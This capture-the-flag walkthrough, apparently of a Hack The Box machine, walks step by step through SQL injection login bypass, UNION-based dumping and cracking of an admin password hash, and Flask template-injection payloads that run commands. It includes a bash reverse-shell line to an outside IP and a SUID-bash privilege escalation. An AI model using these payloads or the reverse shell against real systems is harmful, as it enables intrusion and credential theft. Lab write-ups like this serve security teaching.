1. Run nmap to discover some open ports and services from the web server and I discover only port 80 is opened.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/3aafa463-69a2-43d6-a334-5cebca72d477)

2. Open the web server and it shows game website.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/aa13a579-aa8e-4bc1-9545-7811bf1464ee)

3. Use feroxbuster to discover any interesting directories and files.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/e837c385-c9fa-4ca0-af15-e59b3a9db01b)

4. Checking one by one features and try to do login in the web server.<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/738b6279-7769-42b8-a7a9-ad2fa751e61b)

5. First thing that i thought is SQLi vulnerability, so let's try input ` ' OR 1=1 -- ` and it works by returning message Login Success!
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/5a0cb110-21e2-41ed-b827-bd0c06bc6730)

6. Send request to the web server and I successfully login as admin.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/aba04fda-567f-4f01-8c88-95cbd486b8af)
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/baff21c4-4ad1-4b92-8bad-de9548c4dc28)

7. There is change password in there (I'll use it later) but unfortunately it returns error 500.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/7d89eaeb-a2fe-4e1f-9321-8ae7f0477d9a)

8. Now I must find the admin credentials. I use union-based injection and try one by one until it says login successful. In the photo I can discover that the last number (from 4) are being executed by the system. 
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/6a718a1d-db26-4e7b-9790-9810bd5bf917)

9. The first objective is to find what database is stored inside the web server. To do that, I can execute this payload `' UNION SELECT 0,1,2,concat(schema_name, ' ') FROM information_schema.schemata -- `
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/2aaaae11-e5af-4ec4-8af5-61008bde2010)

10. Realize that only 2 databases inside the web server and the main focus is the **main** database. Next I want to find the table content inside the database with this payload `' UNION SELECT 0,1,2,concat(table_name, ' ') FROM information_schema.tables where table_schema = 'main' -- `
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/04fd3fdb-eb49-4fdf-b2cf-97ae76003d5d)

11. There are 3 tables inside the main database and I directly refer to user table. Before accessing that, I must know what column that are set in the table with this payload `' UNION SELECT 0,1,2,concat(column_name, ' ') FROM information_schema.columns where table_name = 'user' -- `
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/3b7fa45d-907a-4ad0-a6c8-e3514974b46a)

12.The columns are known and I just directly grab the data with this payload `' UNION SELECT 0,1,2,concat(id, ' ', email, ' ', password, ' ', name) FROM user -- `
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/36b99644-78dc-4559-bc85-641db664ecca)<br>

Admin user data:
id = 1
email = admin@goodgames.htb 
password (hash) = 2b22337f218b2d82dfc3b6f77e7cb8ec 
name = admin

13.Seems like the password been hashed using md5, so I use this [tool](https://crackstation.net/) to crack it and found that the password is **superadministrator**
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/6d87ec60-1ca1-4021-83b5-299674e50015)

14. Next I are checking what the setting feature (Right corner above) can do. When I clicked, it directed to internal-administrator.htb but I can't access the web.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/e8d5eb02-0737-4804-977d-5608c2d806f6)

15. Add internal-administrator.htb to /etc/hosts and you can open the website and needs to login.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/2153abfb-5929-4068-bb53-d57a45c11cb9)
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/cc48f6dc-33b1-48dc-ba32-af2bec1a8ef0)

16. Input admin credentials that have been found and directed to admin's dashboard page.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/80d5d4dd-a0ae-4f49-abf5-c947f2dc0ebe)

17. From the web server name, it indicates to flask. The first thing related to flask is SSTI. In settings feature, I try to put this payload `{{ 6 * 8 }}`. If the output is 48, then it's vulnerable to SSTI.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/e6e29e8d-3d5f-4fc8-ac1b-b71abcff02ae)

18. Yep, it's vulnerable. I can execute the payload from this [source](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md) to execute bash command.

Payload:
`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/fc10d462-723c-46ef-ab7b-68408211a275)

19. It shows the information of admin's id which means it works. Next I're going to takeover the admin's shell with reverse shell attack and for the script you can make with this [tool] (https://www.revshells.com/)

Payload:
`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.13/777 0>&1"').read() }}`.

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/ba4a4d6f-8ae7-439f-bf53-afb0fbfab298)
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/db65f6e4-3a79-49bf-aa58-0a63c24ad5fa)

20. I successfully access the admin's shell and get the user flag in /home/augustus/user.txt.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/a6b5b035-a2e2-49cb-b56d-d072ac6965fa)

21. I know that this is already the root one, but I can't find the root flag here. Realize that I still have augustus account that haven't I check. To do that, first I must know his IP address using `ip a` command.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/69f5513f-d776-4793-9132-0675eccb3e78)

22. Knowing that all the ports in 172.19.0.2 are opened. Now I must find another address that opened or indicates that's augustus's shell. I can use loop in bash with this payload `for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;`.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/bf266e7e-d51f-4f7f-a302-76c5a81d53be)

23. The result is there are two open ports in 172.19.0.xxx. Next I check which ports are open in IP 172.19.0.1 with this command `for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT &>/dev/null" 2>/dev/null && echo "$PORT is open"; done`.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/9fbe3b3a-86e4-4fa0-a896-62a424ece4d1)

24. Unfortunately, the terminal doesn't have ssh access and I can't just access directly to augustus's shell because the partitions isn't mounted yet.<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/d35951e1-c436-41ad-924a-f02f4ff34e64)

25. To mount augustus's partitions (sda1) I can run `mount | grep augustus`.<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/41e08e49-21c0-4021-80d7-68e0e18de662)

26. Run `script /dev/null bash` to use the original bash (not user bash) and run `ssh augustus@172.19.0.1` where the password is **superadministrator** (the admin credential).<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/b1061c61-80b7-49e8-9ed5-eaf19542dd1b)

27. Try to open the root and it says permission denied so I can't access it.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/ecc569b3-ff6f-4fbf-9252-2b1ae37fdbd1)

28. Next step is I need to copy augustus's bash terminal to root to see the privilege. I can run `ls -l bash` to check it and found that the UID must be 1000.<br> 
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/e003b2a4-3c73-40cb-bb67-ac5c959462ae)

29. I're accessing the root privilege so the bash owner must be controlled by root. I can use `chown root:root bash` to transfer file ownership to root and give all access with `chmod 7777`.<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/caa2f2b5-723e-4ce8-8745-5d91ca9d7fc8)

30. Open augustus's shell again with ssh and run the new privilege bash that has been settled in previous step with command `./bash -p`. There I get the root privilege and get the root flag in /root/root.txt.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/522a97f7-7c36-43a1-bff1-06efbb1391e8)



















































